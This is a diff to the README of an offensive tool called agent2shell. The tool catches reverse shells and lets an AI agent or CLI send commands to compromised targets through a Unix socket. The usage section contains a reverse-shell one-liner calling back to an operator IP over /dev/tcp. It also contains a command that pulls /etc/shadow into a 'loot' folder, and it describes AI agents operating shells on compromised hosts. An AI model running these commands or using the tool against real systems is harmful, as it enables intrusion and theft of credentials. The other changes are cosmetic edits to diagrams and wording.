@@ -14,7 +14,7 @@ make build
 agent2shell catch -p 4444
 
 # Target sends reverse shell
-bash -i >& /dev/tcp/OPERATOR_IP/4444 0>&1
+bash -c 'bash -i >& /dev/tcp/OPERATOR_IP/4444 0>&1'
 
 # Terminal 2: send commands
 agent2shell run whoami
@@ -27,13 +27,13 @@ agent2shell pull /etc/shadow ./loot/shadow
 ## Architecture
 
 ```
-Target (reverse shell) ──TCP:4444──→ agent2shell catch ──Unix socket──→ AI agent / CLI
-                                          │
-                                    /tmp/a2s-1.sock
-                                          │
-                                    agent2shell run
-                                    agent2shell status
-                                    agent2shell push/pull
+Target (reverse shell) -> TCP:4444 -> agent2shell catch -> Unix socket -> AI agent / CLI
+                                            |
+                                      /tmp/a2s-1.sock
+                                            |
+                                      agent2shell run
+                                      agent2shell status
+                                      agent2shell push/pull
 ```
 
 The operator runs `catch` to listen for a reverse shell. On connection, a Unix domain socket is created. Any process on the same machine can send commands through the socket.
@@ -153,7 +153,7 @@ Each command produces one line:
 Run agent2shell on a remote server and control it from your laptop:
 
 ```
-Target ──reverse shell──→ EC2 (agent2shell catch) ←──SSH tunnel── Your laptop
+Target -> reverse shell -> EC2 (agent2shell catch) <- SSH tunnel <- Your laptop
 ```
 
 ```bash
@@ -219,7 +219,7 @@ make fmt                # gofmt + goimports
 
 ## Security Considerations
 
-agent2shell runs on operator-controlled infrastructure, not on the target. The Unix socket, temp files, and IPC all live on the operator-controlled machine.
+agent2shell runs on operator-controlled infrastructure, not on the target. The Unix socket, temp files, and all state live on the operator-controlled machine.
 
 ## License
 
